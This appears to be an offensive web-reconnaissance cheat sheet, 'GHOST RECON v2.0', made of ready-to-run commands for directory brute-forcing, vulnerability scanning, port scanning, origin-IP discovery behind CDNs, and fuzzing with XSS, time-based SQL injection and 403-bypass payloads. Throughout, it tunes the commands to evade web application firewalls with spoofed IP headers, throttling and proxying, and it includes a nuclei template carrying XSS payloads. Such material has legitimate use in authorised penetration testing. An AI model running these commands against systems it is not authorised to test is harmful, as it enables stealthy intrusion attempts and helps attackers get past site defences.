
# REFERENCE ONLY — a cheat sheet of tool syntax, not a script to execute.
return 0 2>/dev/null || exit 0
# ══════════════════════════════════════════════════════════════════════════════
# GHOST RECON v2.0 — GOD-TIER CLI SYNTAX & FAILOVER MATRIX
# ══════════════════════════════════════════════════════════════════════════════
#
# For each class: PRIMARY advanced command + FAILOVER alternative(s)
# Includes: recursive flags, rate-limits, headers, WAF-evasion args
#

# ─────────────────────────────────────────────────────────────────────────────
# 1. ADVANCED FUZZING & DIRECTORY BRUTEFORCING
# ─────────────────────────────────────────────────────────────────────────────

## PRIMARY: ffuf
## Full WAF-evasion: rate limit, recursion, filter, custom headers, match codes

ffuf -u "https://TARGET/FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt \
  -mc 200,201,204,301,302,307,401,403,405 \
  -fc 404 \
  -fs 0 \
  -ac \
  -recursion -recursion-depth 3 \
  -rate 15 \
  -t 20 \
  -timeout 10 \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Originating-IP: 127.0.0.1" \
  -H "Host: TARGET" \
  -o ffuf_results.json -of json \
  -replay-proxy http://127.0.0.1:8080

# Variant: Extension fuzzing
ffuf -u "https://TARGET/FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt \
  -e .php,.asp,.aspx,.jsp,.json,.xml,.yml,.env,.bak,.sql,.conf,.log,.txt,.old \
  -mc 200,301,302,403 -ac -rate 10 -t 15 -timeout 8

## FAILOVER 1: feroxbuster (Rust, recursive by default, smart filtering)

feroxbuster -u https://TARGET \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt \
  --rate-limit 15 \
  --threads 20 \
  --timeout 10 \
  --depth 3 \
  --auto-tune \
  --smart \
  --status-codes 200,201,204,301,302,307,401,403,405 \
  --headers "X-Forwarded-For: 127.0.0.1" "User-Agent: Mozilla/5.0" \
  --insecure \
  --output ferox_results.txt

## FAILOVER 2: dirsearch (Python, good WAF bypass)

dirsearch -u https://TARGET \
  -e php,asp,aspx,jsp,json,xml,yml,env,bak,sql,conf,old \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt \
  -r -R 3 \
  --threads 15 \
  --delay 0.1 \
  --timeout 10 \
  --random-agent \
  --header "X-Forwarded-For: 127.0.0.1" \
  --follow-redirects \
  --exclude-status 404 \
  --format json \
  -o dirsearch_results.json

## FAILOVER 3: wfuzz (advanced content filtering)

wfuzz -u "https://TARGET/FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt \
  --hc 404 \
  --hl 0 \
  -t 15 \
  -s 0.1 \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -f wfuzz_results.json,json \
  -R 2

# ─────────────────────────────────────────────────────────────────────────────
# 2. VULNERABILITY SCANNING
# ─────────────────────────────────────────────────────────────────────────────

## PRIMARY: nuclei (with custom WAF-evasion flags)

# Standard: critical+high scan with rate limiting
nuclei -l alive_hosts.txt \
  -severity critical,high,medium \
  -rate-limit 15 \
  -bulk-size 10 \
  -concurrency 5 \
  -timeout 10 \
  -retries 1 \
  -silent -no-color \
  -json-export nuclei_results.json \
  -exclude-templates ssl/,dns/ \
  -header "X-Forwarded-For: 127.0.0.1" \
  -header "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# WAF-evasion scan: lower rate, proxy chain
nuclei -l alive_hosts.txt \
  -severity critical,high \
  -rate-limit 5 \
  -bulk-size 3 \
  -concurrency 2 \
  -timeout 15 \
  -retries 2 \
  -json-export nuclei_stealth.json \
  -proxy http://127.0.0.1:8080 \
  -header "X-Originating-IP: 127.0.0.1" \
  -header "X-Real-IP: 127.0.0.1" \
  -header "True-Client-IP: 127.0.0.1" \
  -interactsh-url https://your-interact.sh

# Targeted: specific template against origin IP (bypasses WAF)
nuclei -u https://ORIGIN_IP/ \
  -header "Host: TARGET_DOMAIN" \
  -t /path/to/custom-templates/ \
  -severity critical,high \
  -rate-limit 3 \
  -json-export nuclei_origin.json

## FAILOVER: Custom nuclei template for WAF-evasion (example)

# File: custom-waf-bypass.yaml
# id: ghost-waf-bypass-xss
# info:
#   name: XSS via WAF bypass
#   severity: high
# requests:
#   - method: GET
#     path:
#       - "{{BaseURL}}/?q=%3Csvg/onload=confirm(1)%3E"
#       - "{{BaseURL}}/?q=%22%3E%3Cdetails/open/ontoggle=confirm(%27XSS%27)%3E"
#     headers:
#       X-Forwarded-For: "127.0.0.1"
#       True-Client-IP: "127.0.0.1"
#     matchers-condition: or
#     matchers:
#       - type: word
#         part: body
#         words:
#           - "<svg/onload="
#           - "<details/open/"

# ─────────────────────────────────────────────────────────────────────────────
# 3. NETWORK RECON / PORT SCANNING / SERVICE FINGERPRINTING
# ─────────────────────────────────────────────────────────────────────────────

## PRIMARY: nmap (full fingerprinting + scripts)

# Standard: Top 1000 + custom ports, service version
nmap -sS -sV -O \
  --top-ports 1000 \
  -p 21,22,25,53,80,110,143,443,445,993,995,1433,1521,2082,2083,2086,2087,3000,3306,3389,4443,5000,5432,5900,5985,6379,7443,8000,8080,8443,8888,9090,9200,9443,10443,11211,27017 \
  --open \
  -T3 \
  -Pn \
  --max-retries 1 \
  --script=http-title,http-headers,ssl-cert,http-robots.txt,http-git-head \
  -oA nmap_full \
  TARGET_IP

# Origin IP deep scan (post-CDN bypass)
nmap -sS -sV -sC \
  -p- \
  --open \
  -T4 \
  -Pn \
  --max-retries 2 \
  --script=vuln,exploit \
  --script-args=http.useragent="Mozilla/5.0" \
  -oA nmap_origin_deep \
  ORIGIN_IP

# UDP scan (targeted)
nmap -sU --top-ports 50 -T4 --open -Pn TARGET_IP

## FAILOVER 1: masscan (speed scan → nmap follow-up)

# Phase 1: Fast port discovery
masscan TARGET_IP/32 \
  -p 0-65535 \
  --rate 1000 \
  --banners \
  --open \
  --source-port 61000 \
  -oJ masscan_results.json

# Phase 2: nmap service fingerprint on discovered ports
nmap -sV -sC -p $(jq -r '.[]|.ports[]|.port' masscan_results.json | sort -un | tr '\n' ',') \
  -Pn -T3 --max-retries 1 \
  TARGET_IP

## FAILOVER 2: naabu (Go, fast + reliable)

naabu -host TARGET_IP \
  -top-ports 1000 \
  -p 21,22,25,53,80,443,3306,5432,6379,8080,8443,9090,9200,27017 \
  -rate 500 \
  -c 25 \
  -timeout 5000 \
  -silent \
  -json \
  -o naabu_results.json

# Follow up with nmap fingerprinting on discovered ports
naabu -host TARGET_IP -top-ports 1000 -silent | \
  nmap -sV -sC -Pn -T3 -iL - -oA naabu_nmap

# ─────────────────────────────────────────────────────────────────────────────
# 4. BONUS: ORIGIN IP DISCOVERY (CDN BYPASS)
# ─────────────────────────────────────────────────────────────────────────────

# Step 1: Find target ASN prefix ranges
# Visit https://bgp.he.net/ and find the target's ASN

# Step 2: hakoriginfinder
prips TARGET_IP_RANGE/24 | hakoriginfinder -h https://TARGET_DOMAIN -t 32

# Step 3: Shodan SSL cert search
shodan search "ssl.cert.subject.cn:TARGET_DOMAIN" --fields ip_str,port,org

# Step 4: Censys search
censys search "services.tls.certificates.leaf.names: TARGET_DOMAIN" \
  --index-type hosts

# Step 5: Validate found origin
curl -sk https://CANDIDATE_IP/ -H "Host: TARGET_DOMAIN" | head -50
# Compare response with CDN version

# ─────────────────────────────────────────────────────────────────────────────
# 5. BONUS: ADVANCED FUZZING WITH PAYLOAD INJECTION
# ─────────────────────────────────────────────────────────────────────────────

# XSS fuzzing with ffuf
ffuf -u "https://TARGET/search?q=FUZZ" \
  -w /usr/share/seclists/Fuzzing/XSS/xss-payload-list.txt \
  -mc 200 \
  -mr "(<script|onerror|onload|alert|confirm|prompt)" \
  -rate 5 -t 10 \
  -H "User-Agent: Mozilla/5.0" \
  -o xss_fuzz.json -of json

# SQLi time-based fuzzing
ffuf -u "https://TARGET/api/item?id=FUZZ" \
  -w sqli_time_payloads.txt \
  -mc all \
  -ft ">8000" \
  -rate 3 -t 5 \
  -timeout 15 \
  -o sqli_fuzz.json -of json

# 403 Bypass fuzzing
ffuf -u "https://TARGET/FUZZ/admin/" \
  -w /usr/share/seclists/Discovery/Web-Content/403-bypass.txt \
  -mc 200,301,302 \
  -rate 10 -t 15 \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Original-URL: /admin/" \
  -o 403_bypass.json -of json
